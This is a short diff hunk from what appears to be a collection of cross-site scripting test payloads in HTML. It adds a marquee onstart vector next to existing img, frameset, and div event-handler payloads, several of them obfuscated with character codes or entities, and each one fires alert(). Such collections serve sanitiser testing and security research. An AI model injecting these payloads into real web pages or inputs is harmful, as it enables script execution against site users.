@@ -10,7 +10,7 @@
 <img src="#<frameset onload=alert(123)>" alt="onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)"/>
 
 <img src="https://raw.githubusercontent.com/r89shi/r89shi.github.io/master/index.html" onselect="alert(String.fromCharCode(88,83,83))"/>
-
+<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
 <div dir=autofocus/onfocus=alert()>
   <isindex>
 </div>
